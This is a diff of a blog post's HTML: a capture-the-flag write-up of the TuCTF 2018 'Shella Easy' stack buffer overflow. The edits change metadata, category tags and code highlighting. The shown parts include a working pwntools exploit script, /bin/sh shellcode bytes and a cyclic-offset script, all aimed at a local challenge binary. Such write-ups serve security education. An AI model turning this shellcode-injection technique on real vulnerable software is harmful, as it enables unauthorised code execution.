@@ -4,7 +4,7 @@
 <meta http-equiv=x-ua-compatible content="ie=edge">
 <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
 <meta name=author content>
-<meta name=description content="TuCTF 2018 'Shella Easy' challenge.">
+<meta name=description content="TuCTF 2018 'Shella Easy' challenge writeup.">
 <meta name=keywords content>
 <meta name=robots content="noodp">
 <meta name=theme-color content>
@@ -15,23 +15,23 @@ TuCTF 2018 :: Shella Easy :: Anubis
 <link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
 <link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
 <meta itemprop=name content="TuCTF 2018 :: Shella Easy">
-<meta itemprop=description content="TuCTF 2018 'Shella Easy' challenge."><meta itemprop=datePublished content="2021-08-11T00:00:00+00:00">
+<meta itemprop=description content="TuCTF 2018 'Shella Easy' challenge writeup."><meta itemprop=datePublished content="2021-08-11T00:00:00+00:00">
 <meta itemprop=dateModified content="2021-08-11T00:00:00+00:00">
 <meta itemprop=wordCount content="1152"><meta itemprop=image content="https://anvbis.github.io">
 <meta itemprop=keywords content>
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://anvbis.github.io">
 <meta name=twitter:title content="TuCTF 2018 :: Shella Easy">
-<meta name=twitter:description content="TuCTF 2018 'Shella Easy' challenge.">
+<meta name=twitter:description content="TuCTF 2018 'Shella Easy' challenge writeup.">
 <meta property="og:title" content="TuCTF 2018 :: Shella Easy">
-<meta property="og:description" content="TuCTF 2018 'Shella Easy' challenge.">
+<meta property="og:description" content="TuCTF 2018 'Shella Easy' challenge writeup.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://anvbis.github.io/posts/tuctf-2018-shella-easy/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2021-08-11T00:00:00+00:00">
 <meta property="article:modified_time" content="2021-08-11T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
+<meta property="article:section" content="Stack BOF">
+<meta property="article:section" content="CTF">
 <meta property="article:section" content="Linux">
-<meta property="article:section" content="Stack Overflow">
-<meta property="article:section" content="Capture the Flag">
 <meta property="article:published_time" content="2021-08-11 00:00:00 +0000 UTC">
 </head>
 <body>
@@ -154,26 +154,26 @@ Breakpoint 1, 0x0804853e in main ()
 0xffffcff0:     0x41414141
 </code></pre><p>Now let&rsquo;s find the location of the function&rsquo;s return address stored on the stack relative to our input buffer.</p>
 <p>We can write a quick script using pwntools that sends a cyclic pattern of bytes (with the <code>var_8h</code> variable overwritten with <code>0xdeadbeef</code>) that we can use to determine the location of the return address.</p>
-<pre><code>#!/usr/bin/env python3
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
 
-from pwn import *
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
 
-pad = b'A'*64
-var = p32(0xdeadbeef)
+pad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>64</span>
+var <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>)
 
-r = process('./shella-easy')
-gdb.debug(r)
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./shella-easy&#39;</span>)
+gdb<span style=color:#f92672>.</span>debug(r)
 
-r.writeline(pad + var + cyclic(64))
-r.interactive()
-</code></pre><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
+r<span style=color:#f92672>.</span>writeline(pad <span style=color:#f92672>+</span> var <span style=color:#f92672>+</span> cyclic(<span style=color:#ae81ff>64</span>))
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>We know that the program should crash once we&rsquo;ve overwritten the return address with our bad data. So printing the value of <code>$eip</code> after the crash should give us the bytes that the return address was overwritten with.</p>
 <pre><code>pwndbg&gt; p $eip
 $1 = (void (*)()) 0x61616163
 </code></pre><p>We can use pwntools' <code>cyclic_find</code> function and the bytes contained within <code>eip</code> above, in order to find the offset of the return address from the end of our payload.</p>
-<pre><code>In [2]: cyclic_find(0x61616163)
-Out[2]: 8
-</code></pre><h2 id=exploit-development>Exploit Development</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>2</span>]: cyclic_find(<span style=color:#ae81ff>0x61616163</span>)
+Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>8</span>
+</code></pre></div><h2 id=exploit-development>Exploit Development</h2>
 <p>Now that we know the location of <code>var_8h</code> and the return address relative to our input buffer we can begin to craft our exploit.</p>
 <p>We know that we can execute arbitrary code within the stack, so let&rsquo;s write up some quick shellcode to give us an interactive shell.</p>
 <pre><code>.global _start
@@ -195,38 +195,38 @@ exit:
 </code></pre><p>Let&rsquo;s compile our shellcode, and get a representation of it that we can use in our exploit code.</p>
 <pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
 $ objcopy --dump-section .text=payload shellcode
-</code></pre><pre><code>In [1]: open('payload','rb').read()
-Out[1]: b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
-</code></pre><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
+</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>1</span>]: open(<span style=color:#e6db74>&#39;payload&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read()
+Out[<span style=color:#ae81ff>1</span>]: <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;h/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>h/bin</span><span style=color:#ae81ff>\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style=color:#e6db74>&#39;</span>
+</code></pre></div><p>Now we can build our exploit. Here is an outline of what we want to achieve:</p>
 <ul>
 <li>Capture the leaked stack address.</li>
 <li>Overwrite <code>var_8h</code> with <code>0xdeadbeef</code>.</li>
 <li>Overwrite the return address using the leak.</li>
 <li>Get code execution.</li>
 </ul>
-<pre><code>#!/usr/bin/env python3
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
 
-from pwn import *
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
 
 
-buf = b'h/sh\x00h/bin\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80'
+buf <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;h/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>h/bin</span><span style=color:#ae81ff>\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x00\x00\x00\x00\xcd\x80</span><span style=color:#e6db74>&#39;</span>
 
-pad = b'A'*(64 - len(buf))
-var = p32(0xdeadbeef)
-off = b'A'*8
+pad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>64</span> <span style=color:#f92672>-</span> len(buf))
+var <span style=color:#f92672>=</span> p32(<span style=color:#ae81ff>0xdeadbeef</span>)
+off <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>
 
-r = process('./shella-easy')
-#gdb.attach(r)
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./shella-easy&#39;</span>)
+<span style=color:#75715e>#gdb.attach(r)</span>
 
-# capture the leaked stack address
-r.readuntil('Yeah I\'ll have a ')
-leak = p32(eval(r.read(10)))
-r.clean()
+<span style=color:#75715e># capture the leaked stack address</span>
+r<span style=color:#f92672>.</span>readuntil(<span style=color:#e6db74>&#39;Yeah I</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>ll have a &#39;</span>)
+leak <span style=color:#f92672>=</span> p32(eval(r<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>10</span>)))
+r<span style=color:#f92672>.</span>clean()
 
-# send our payload to the binary
-r.writeline(buf + pad + var + off + leak)
-r.interactive()
-</code></pre><p>And finally, here&rsquo;s the exploit in action.</p>
+<span style=color:#75715e># send our payload to the binary</span>
+r<span style=color:#f92672>.</span>writeline(buf <span style=color:#f92672>+</span> pad <span style=color:#f92672>+</span> var <span style=color:#f92672>+</span> off <span style=color:#f92672>+</span> leak)
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>And finally, here&rsquo;s the exploit in action.</p>
 <pre><code>./exploit.py 
 [+] Starting local process './shella-easy': pid 3768
 [*] Switching to interactive mode
@@ -238,9 +238,9 @@ TuCTF{Shella Easy}
 <hr>
 <div class=post-info>
 <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://anvbis.github.io/categories/stack-bof/>Stack BOF</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/ctf/>CTF</a></span>
 <span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
-<span class=tag><a href=https://anvbis.github.io/categories/stack-overflow/>Stack Overflow</a></span>
-<span class=tag><a href=https://anvbis.github.io/categories/capture-the-flag/>Capture the Flag</a></span>
 </p>
 </div>
 </main>
